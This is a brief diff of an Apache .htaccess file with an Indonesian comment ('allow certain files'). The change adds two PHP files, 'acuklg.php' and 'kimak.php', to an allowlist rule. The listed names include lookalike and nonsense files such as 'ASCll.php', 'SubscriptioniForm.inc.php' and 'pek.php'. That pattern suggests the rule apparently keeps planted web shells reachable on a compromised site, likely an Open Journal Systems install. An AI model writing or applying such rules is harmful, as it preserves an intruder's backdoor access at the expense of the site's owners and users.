@@ -11,7 +11,7 @@ Require all granted
 </FilesMatch>
 
 # Izinkan file tertentu
-<FilesMatch '^(pek.php|acuk.php|SettingsDAO.inc.php|SubscriptioniForm.inc.php|Array.php|ASCll.php|CreateStringy.php|POP3Mailer.php|CssInlineStyles.php|issues.tpl.php)$'>
+<FilesMatch '^(pek.php|acuk.php|SettingsDAO.inc.php|SubscriptioniForm.inc.php|Array.php|ASCll.php|CreateStringy.php|POP3Mailer.php|CssInlineStyles.php|acuklg.php|kimak.php|issues.tpl.php)$'>
 Require all granted
 </FilesMatch>
 
